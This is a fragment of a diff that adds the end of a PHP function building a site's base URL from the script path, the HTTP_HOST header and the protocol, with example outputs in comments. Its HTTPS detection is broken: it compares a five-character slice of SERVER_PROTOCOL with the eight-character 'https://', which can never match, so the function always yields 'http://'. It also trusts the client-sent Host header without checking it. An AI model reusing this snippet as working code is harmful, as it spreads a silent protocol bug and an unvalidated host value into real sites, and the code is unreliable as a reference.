+	// output: Array ( [dirname] => /myproject [basename] => index.php [extension] => php [filename] => index ) 
+	$pathInfo = pathinfo($currentPath); 
+	
+	// output: localhost
+	$hostName = $_SERVER['HTTP_HOST']; 
+	
+	// output: http://
+	$protocol = strtolower(substr($_SERVER["SERVER_PROTOCOL"],0,5))=='https://'?'https://':'http://';
+	
+	// return: http://localhost/myproject/
+	return $protocol.$hostName.$pathInfo['dirname'].'/';
+}
 ?>
